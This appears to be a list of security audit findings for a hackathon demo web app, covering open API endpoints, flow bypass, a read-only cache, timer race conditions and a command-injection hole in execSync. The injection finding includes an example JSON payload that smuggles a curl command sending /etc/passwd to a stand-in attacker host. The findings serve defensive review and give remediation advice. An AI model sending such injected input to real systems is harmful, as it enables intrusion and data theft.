title: All API endpoints unauthenticated — any caller can extract all demo data
evidence: POST /api/analyze accepts any JSON body with no auth, API key, or origin check. GET /api/roast, /api/compare, /api/persona all return pre-cached data to any caller. No middleware.ts exists. Any internet client can extract the full demo dataset (4,463 txns, wallet analysis, persona profiles, leaderboard) by calling these endpoints.
rationale: In a hackathon demo, the data is public mock data — there's nothing to 'steal.' The demo is designed to be accessible. Severity P2 because the exposure surface is intentional and the data has no real value.
fix_guidance: No action needed for demo. For production: add authentication and rate limiting. Document that endpoints are intentionally open.

title: Users can skip the full flow — LOAD DEMO bypasses wallet input, DevTools bypasses phase transitions
evidence: launchDemo() at line 15 directly calls handleAnalyze with hardcoded demo addresses — bypassing any wallet input validation. setPhase is a React state setter in a 'use client' component — accessible from React DevTools to jump to any phase. The x402 payment mock at the CTA phase is reachable without going through the analysis flow.
rationale: User has incentive to skip the full 76-second flow to reach the 'ATTESTATION VERIFIED' badge and payment CTA. No mechanism prevents this — the demo is designed for easy navigation. The CTA is a mock payment button, so skipping provides no real value.
fix_guidance: For demo: acceptable. The LOAD DEMO button is intentional UX. For production: add server-side phase validation — each API endpoint should verify prerequisites were met before returning data.

title: Cache data integrity is protected — all cache operations are read-only
evidence: All cache.ts functions (loadWalletA/B/C, loadPatterns, loadPersonas, loadComparison, loadRoastBattle, loadLeaderboard, loadAllDemoData, cacheExists) use only fs.readFileSync and fs.existsSync. grep across entire src/ confirms zero fs.writeFileSync, writeFile, or .write() calls. The 9 JSON cache files are read-only at runtime. No API endpoint can corrupt the cached data.
rationale: The cache is read-only by construction. No write path exists in the runtime code. The only way to modify cache data is through the (missing) seed-demo.ts script or direct filesystem access. This is correct and safe for a demo.
fix_guidance: No action needed. Read-only pattern is correct.

title: Command injection vector in OnchainOS execSync — unsanitized user input passed to shell
evidence: onchainos.ts line 6-14: run(cmd) calls execSync(cmd) with string interpolation. Lines 31: `run('onchainos portfolio all-balances --address ${address} --chains ${chainsStr}')`, 47: `run('onchainos market portfolio-overview --address ${address}...')`, 60: `run('onchainos leaderboard list --chain ${chain}...')`, 70: `run('onchainos security approvals --address ${address}')`, 78: `run('onchainos security token-scan --tokens ${tokensStr}')`. The address, chain, and tokensStr values originate from JSON.parse'd user input in POST /api/analyze with NO sanitization. E.g., sending {"addresses":[{"address":"0x1; curl http://evil.com/$(cat /etc/passwd)","chains":["ethereum"]}]} would inject shell commands.
rationale: CRITICAL in production: unsanitized user input flows directly into execSync shell commands. In demo mode, this code is dead — cacheExists() always returns true, short-circuiting at line 13. But if cache files are ever removed or DEMO_MODE is false, this becomes a live command injection vulnerability. Currently P0 in potential, P2 in practice since the code path is unreachable in demo.
fix_guidance: Use child_process.spawn() with argument arrays instead of execSync with string interpolation. Validate address format (0x[a-fA-F0-9]{40} for EVM, base58 regex for Solana) before passing to CLI. Never interpolate user input into shell command strings.

title: Timer-based phase transitions lack atomicity — abort can leave phantom state and orphaned timers
evidence: page.tsx: 4 setTimeout calls (t1=2s→results, t2=20s→battle, t3=58s→compare, t4=76s→cta) use fire-and-forget with no AbortController. Cleanup effect at line 26 clears timers on unmount, but race condition exists: if timers fire between unmount and cleanup, setPhase executes on unmounted component. RoastBattle.tsx lines 9-21: nested auto-advancing round timers with no pause/skip controls. Catch block at line 38 resets phase to 'landing' but doesn't clear timer refs. No state persistence across refresh — entire flow resets on page reload.
rationale: No financial consequence in demo, but poor UX if demo fails mid-flow. If the user refreshes during battle phase, they must restart from landing. Timers can fire on unmounted components, causing React warnings.
fix_guidance: Use AbortController for fetch calls in setTimeout. Add isMounted ref guard in timer callbacks. Consider using a state machine library (XState) for atomic phase transitions. Add manual controls (pause/skip) to roast battle.
